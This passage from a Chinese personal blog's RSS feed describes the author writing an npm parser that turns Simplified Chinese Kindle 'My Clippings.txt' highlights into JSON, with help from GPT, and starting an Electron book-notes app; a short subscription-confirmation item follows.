&lt;p&gt;一个有名的简体中文 Kindle 网站是&lt;a href=&quot;https://bookfere.com&quot;&gt;书伴网&lt;/a&gt;。它推出了&lt;a href=&quot;https://memo.bookfere.com&quot;&gt;书见&lt;/a&gt;，提供了 My Clippings.txt 书摘导入上传的功能。并且在导入的页面支持简单的编辑、去重等功能。然而，我使用的时候还是有几个小问题让我不太喜欢：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;书摘解析器并不完美。比如不能正确处理 CRLF 和 LF 两种换行符的问题。&lt;/li&gt;
&lt;li&gt;存在 bug，比如对一本书修改作者名后，如果存在两本书名、作者名都相同的书籍（重复书籍），不会自动合并。（这个 bug 一般人应该不会遇到，是因为我用 Calibre 管理 Kindle 书籍时，读书读到一半发现作者有误，修改了作者，后面的笔记记录的作者也修改了）&lt;/li&gt;
&lt;li&gt;数据不能导出。我不相信任何网站能够长久存在。我希望导入的书摘数据能存到我的本地。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另一个看起来不错的软件是 &lt;a href=&quot;https://knotesapp.com&quot;&gt;Knotes&lt;/a&gt;。它同样支持从 Kindle 等各种地方导入书摘。然而试用之后，还是有我不喜欢的点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;这是一个创业团队的产品，野心似乎不止于简单的书摘管理，功能比较繁多，大多是我用不到的。&lt;/li&gt;
&lt;li&gt;UI 不太喜欢。不是我想要的风格。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我只是想要一个简单的、UI 符合我审美的书摘管理器。而这两个软件中我最需要的功能就是解析、导入 My Clippings.txt。于是我就有了自己写一个的念头。&lt;/p&gt;
&lt;h2&gt;奇怪的格式&lt;/h2&gt;
&lt;p&gt;既然要自己写这样一个软件，首先是要能够解析 My Clippings.txt 文件。以上体验的两个软件，My Clippings.txt 的解析器都不是开源的。&lt;/p&gt;
&lt;p&gt;这个文件内容大概是这样的：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;平凡的世界 (路遥)
- 您在第 280 页（位置 #4283-4286）的标注 | 添加于 2023年5月19日星期五 下午1:11:48

勿容置疑，她是一个普普通通的人，她的思想、气质、感情，优点和缺点，都是属于普通人的。但普通人和出类拔萃的人一样，也有自己的欢乐和痛苦，只不过不为大多数人了解罢了。人们宁愿去关心一个蹩脚电影演员的吃喝拉撒和鸡毛蒜皮，而不愿了解一个普通人波涛汹涌的内心世界……
==========
邓小平时代 (傅高义)
- 您在位置 #388-390的标注 | 添加于 2023年7月4日星期二 下午6:18:24

当会谈结束后他们起身走向门口时，邓小平向麦理浩做了个手势，身高逾一米八的港督俯下身，听到这位身材只有一米五几的主人对他说：“你如果觉得统治香港不容易，那就来统治中国试试。”
==========
人类群星闪耀时 (斯蒂芬·茨威格)
- 您在第 172 页（位置 #2633-2637）的标注 | 添加于 2023年7月13日星期四 上午12:09:04

伟大的对决中，英雄虽死犹生，失败中的意志崛起，直抵无限高峰。因为偶然的成功和轻易的胜利只能点燃人的虚荣之心，却不能获得一个人在与不可战胜的强大命运的搏击中，因为覆灭而升华的高尚心灵。这类一切时代，一切悲剧中最伟大的杰作，时常刻画于诗人笔下又千百次地在生活中诞生。 
==========
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;每两条书摘之间用多个等号组成的分割线隔开，每一条记录包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一行：书名、作者。&lt;/li&gt;
&lt;li&gt;第二行：摘录位置和时间。有的位置包含页码，有的不包含。&lt;/li&gt;
&lt;li&gt;空行。&lt;/li&gt;
&lt;li&gt;摘录内容。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;看起来，按照一定的模式可以将其转换为 json 格式。如果有这样一个解析器能够正确解析，实现书摘的管理器就没什么大问题了。&lt;/p&gt;
&lt;h2&gt;构建一个 npm 模块&lt;/h2&gt;
&lt;p&gt;上网搜索了一圈，在 Github 上找到了&lt;a href=&quot;https://github.com/sawyerh/highlights&quot;&gt;这个代码仓库&lt;/a&gt;，仓库里包含了作者自用的书摘管理器，其中&lt;a href=&quot;https://github.com/sawyerh/highlights/blob/main/packages/kindle-clippings-to-json/kindle-my-clippings.js&quot;&gt;这段代码&lt;/a&gt;是一个可用的解析器代码。但是，它只支持英文版的 My Clippings.txt。看来，我可以修改一下使之支持中文版。&lt;/p&gt;
&lt;p&gt;很自然地，想要将其构建成一个 npm 模块方便使用。然而，之前我丝毫没有写 npm 模块的经历，连 node 都不太会用……好在，有万能的 GPT 来帮忙。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如何编写一个 npm 模块？请告诉我典型的目录结构，并给我一个示例代码。&lt;/p&gt;
&lt;p&gt;如何发布一个 npm 模块？&lt;/p&gt;
&lt;p&gt;如何引入并使用一个 npm 模块？&lt;/p&gt;
&lt;p&gt;如何使模块兼容 TypeScript？&lt;/p&gt;
&lt;p&gt;CommonJS 和 ES6 之类的标准有何区别？&lt;/p&gt;
&lt;p&gt;……&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;（事实上，这基本上也是我第一次用 TypeScript 和 eslint……）&lt;/p&gt;
&lt;p&gt;其实代码主要内容是很少的，无非就是按照上面奇怪的格式，先用等号分割每条记录，然后对每条记录分别解析书名、作者、页码、起止位置、时间戳、内容……只是正则表达式依然令人头疼（并且 GPT 似乎也不太懂）。&lt;/p&gt;
&lt;p&gt;于是，这个&lt;a href=&quot;https://github.com/Skywt2003/kindle-zhcn-clippings-to-json&quot;&gt;适用于简体中文的 Kindle MyClippings.txt 解析器&lt;/a&gt;就大功告成啦。它可以解析一个字符串的内容，返回一个 JavaScript Object，包含每条书摘的具体内容。目前我测试的自己的书摘暂时没有遇到 bug。&lt;/p&gt;
&lt;h2&gt;下一步：成型的书摘管理软件&lt;/h2&gt;
&lt;p&gt;接下来是我正在开发的书摘管理软件。&lt;/p&gt;
&lt;p&gt;还是决定基于 Next.js，然而如果要做在线部署的 Web 软件，则要考虑用户登录之类的操作，有些繁琐（我甚至考查了许多可以自托管的 SSO 软件，没有特别满意的）。于是我大胆决定：基于 Electron 开发桌面软件。&lt;/p&gt;
&lt;p&gt;这又是一个完全没接触过的框架。还好，我们有 GPT。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如何基于 Next.js、TypeScript 创建一个 Electron 项目？请告诉我典型的目录结构，并给我一个示例代码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;基本上是用逻辑其实是仿照前面介绍的书见进行开发的。&lt;/p&gt;
&lt;p&gt;开发一个桌面软件和开发一个 Web 软件的前端思路还是有差异的，毕竟是要我们用做网页的思路来做桌面软件。我能想到的就是针对窗口大小调整做出更详细的优化，并让所有 p 元素不可选择 🙃。&lt;/p&gt;
&lt;p&gt;目前这个软件还在开发中。想了很久叫什么名字，最后还是取了直白的「BookNotes」。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2023/08/2102661038.png&quot; alt=&quot;软件启动首页截图，包含随机选取的一句书摘&quot;&gt;&lt;/p&gt;
&lt;p&gt;900 磅的思源宋体真的很好看！&lt;/p&gt;
&lt;p&gt;在这里先挖个坑，等有空慢慢开发吧。&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>感谢订阅 SkyWT 的博客。</title><link>https://skywt.cn/blog/</link><guid isPermaLink="true">https://skywt.cn/blog/</guid><description>订阅成功。</description><pubDate>Wed, 01 Nov 2017 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;订阅成功。该 RSS 源显示最近发布的 20 篇文章。当有新文章时，RSS 源会及时更新。&lt;/p&gt;
&lt;p&gt;前往&lt;a href=&quot;https://skywt.cn/blog/archives&quot;&gt;文章归档&lt;/a&gt;页面即可一览全部文章。&lt;/p&gt;
&lt;p&gt;RSS 真是个伟大的发明，用开放的标准将独立的内容连接在一起，也将我们连接在一起。&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item></channel></rss>